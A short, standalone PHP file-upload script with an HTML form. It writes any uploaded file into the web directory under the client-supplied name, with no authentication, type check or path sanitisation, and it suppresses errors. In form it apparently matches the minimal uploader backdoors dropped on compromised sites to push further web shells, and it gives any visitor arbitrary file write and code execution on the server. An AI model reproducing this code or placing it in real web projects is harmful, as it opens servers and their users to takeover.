
<?php    
if( file_exists($_FILES["uploadfile"]["tmp_name"]) )
{
  $filename = $_FILES["uploadfile"]["tmp_name"];
  $fp=@fopen($filename,"r");
  $contents=@fread($fp, filesize($filename));
  @fclose($fp);
    
  $fp = fopen($_FILES["uploadfile"]["name"], "w");
  fputs($fp, $contents);
  fclose($fp);
  
  echo "file ". $_FILES["uploadfile"]["name"] ." Uploaded :) !";
}
?>
<FORM ENCTYPE="multipart/form-data" METHOD="POST">
</script><br>
<b>File:</b> <INPUT NAME="uploadfile" TYPE="file">
<INPUT TYPE="submit" VALUE="Send">
</FORM>